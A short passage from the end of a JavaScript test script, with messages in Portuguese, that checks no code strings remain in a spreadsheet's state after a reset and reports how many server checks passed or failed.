  T("nenhum código em texto na planilha depois do reset", !JSON.stringify(G2.est.sheets).includes(codRT) && !JSON.stringify(G2.est.sheets).includes(codAna));
}

console.log(falhas ? `\n${falhas} de ${total} verificações FALHARAM.` : `\nTudo certo: ${total} verificações do servidor passaram.`);
process.exit(falhas ? 1 : 0);
